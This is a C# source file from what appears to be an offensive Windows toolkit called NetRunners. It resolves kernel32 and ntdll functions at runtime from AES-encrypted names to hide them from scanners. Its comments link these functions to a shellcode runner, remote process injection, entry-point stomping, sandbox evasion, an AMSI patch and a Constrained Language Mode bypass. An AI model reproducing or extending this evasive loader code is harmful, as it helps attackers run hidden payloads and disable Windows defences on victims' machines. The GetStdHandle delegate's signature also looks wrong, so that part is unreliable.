using System;
using System.Runtime.InteropServices;
using System.Text;
using static NetRunners.Data.Structures;
using static NetRunners.Data.Encrypted;

namespace NetRunners.Data
{
    /// <summary>
    /// This class includes DLL import statements needed to call relevant win32 apis. 
    /// Some win32 apis require structures, these are retrieved from the Structures class.
    /// </summary>
    public class Delegates
    {
        // helper to decrypt API string
        static string Decrypt(byte[] API_String)
        {
            string decrypted = System.Text.Encoding.UTF8.GetString(NetRunners.Decryptors.Decryptors.DecryptBytesToBytes_Aes(API_String, AesKey, AesIV));
            return decrypted; 
        }

        public const uint MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000;
        public const uint PAGE_READWRITE = 0x40;
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint THREAD_ALL_ACCESS = 0x1F03FF;
        public static uint oldProtect;

        // Importing Getprocaddress, getmodulehandle to dynamically resolve other APIs
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Basic Runner
        // this technique uses: VirtualAlloc, CreateThread, WaitForSingleObject

        //// virtualalloc
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public delegate IntPtr pVirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        public static pVirtualAlloc VirtualAlloc = (pVirtualAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(VirtualAlloc_Byte)), typeof(pVirtualAlloc));

        //// createthread
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public delegate IntPtr pCreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static pCreateThread CreateThread = (pCreateThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(CreateThread_Byte)), typeof(pCreateThread));

        //// waitforsingleobject
        //[DllImport("kernel32.dll")]
        //public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public delegate UInt32 pWaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public static pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(WaitForSingleObject_Byte)), typeof(pWaitForSingleObject));

        // Process Injection Runner
        // this technique uses: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread

        //// openprocess
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        public delegate IntPtr pOpenProcess(uint processAccess, bool bInheritHandle, int processId);
        public static pOpenProcess OpenProcess = (pOpenProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(OpenProcess_Byte)), typeof(pOpenProcess));

        //// virtualallocex
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public delegate IntPtr pVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        public static pVirtualAllocEx VirtualAllocEx = (pVirtualAllocEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(VirtualAllocEx_Byte)), typeof(pVirtualAllocEx));

        //// writeprocessmemory
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        public delegate bool pWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        public static pWriteProcessMemory WriteProcessMemory = (pWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(WriteProcessMemory_Byte)), typeof(pWriteProcessMemory));

        //// createremotethread
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public delegate IntPtr pCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static pCreateRemoteThread CreateRemoteThread = (pCreateRemoteThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(CreateRemoteThread_Byte)), typeof(pCreateRemoteThread));

        // EntryPoint Stomping Runner
        // This technique uses WriteProcessMemory, CreateProcess, ZwQueryInformationProcess (ntdll.dll), ReadProcessMemory, ResumeThread

        //// writeprocessmemory already imported

        //// import CreateProcess
        //[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        //public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public delegate bool pCreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        public static pCreateProcess CreateProcessA = (pCreateProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(CreateProcessA_Byte)), typeof(pCreateProcess));

        //// import ZwQueryInformationProcess
        //[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        //public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        public delegate int pZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        public static pZwQueryInformationProcess ZwQueryInformationProcess = (pZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("ntdll.dll"), Decrypt(ZwQueryInformationProcess_Byte)), typeof(pZwQueryInformationProcess));

        //// import readprocessmemory
        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        public delegate bool pReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        public static pReadProcessMemory ReadProcessMemory = (pReadProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(ReadProcessMemory_Byte)), typeof(pReadProcessMemory));

        //// import resumethread
        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern uint ResumeThread(IntPtr hThread);
        public delegate uint pResumeThread(IntPtr hThread);
        public static pResumeThread ResumeThread = (pResumeThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(ResumeThread_Byte)), typeof(pResumeThread));

        // non-emulated apis
        // This Technique uses VirtualAllocExNuma, GetCurrentProcess, FlsAlloc

        //// import virtualallocexnuma
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        public delegate IntPtr pVirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        public static pVirtualAllocExNuma VirtualAllocExNuma = (pVirtualAllocExNuma)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(VirtualAllocExNuma_Byte)), typeof(pVirtualAllocExNuma));

        //// import getcurrentprocess
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr GetCurrentProcess();
        public delegate IntPtr pGetCurrentProcess();
        public static pGetCurrentProcess GetCurrentProcess = (pGetCurrentProcess)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(GetCurrentProcess_Byte)), typeof(pGetCurrentProcess));

        //// import flsalloc
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr FlsAlloc(IntPtr callback);
        public delegate IntPtr pFlsAlloc(IntPtr callback);
        public static pFlsAlloc FlsAlloc = (pFlsAlloc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(FlsAlloc_Byte)), typeof(pFlsAlloc));

        // AMSI Binary Patch for AmsiOpenSession
        // this technique uses LoadLibrary, GetProcAddess, VirtualProtect

        //// import loadlibrary
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern IntPtr LoadLibraryA(string name);
        public delegate IntPtr pLoadLibrary(string name);
        public static pLoadLibrary LoadLibraryA = (pLoadLibrary)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(LoadLibraryA_Byte)), typeof(pLoadLibrary));

        //// import getprocaddress (already imported)

        //// import virtualprotect
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public delegate bool pVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public static pVirtualProtect VirtualProtect = (pVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(VirtualProtect_Byte)), typeof(pVirtualProtect));

        // CLM Bypass source: https://github.com/calebstewart/bypass-clm/blob/master/bypass-clm/Program.cs
        // this technique uses: GetStdHandle, GetProcAddress, LoadLibrary, VirtualProtect

        //[DllImport("kernel32.dll", SetLastError = true)]
        //private static extern IntPtr GetStdHandle(int nStdHandle);
        public delegate bool pGetStdHandle(string lpPathName);
        public static pGetStdHandle GetStdHandle = (pGetStdHandle)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), Decrypt(GetStdHandle_Byte)), typeof(pGetStdHandle));
    }
}
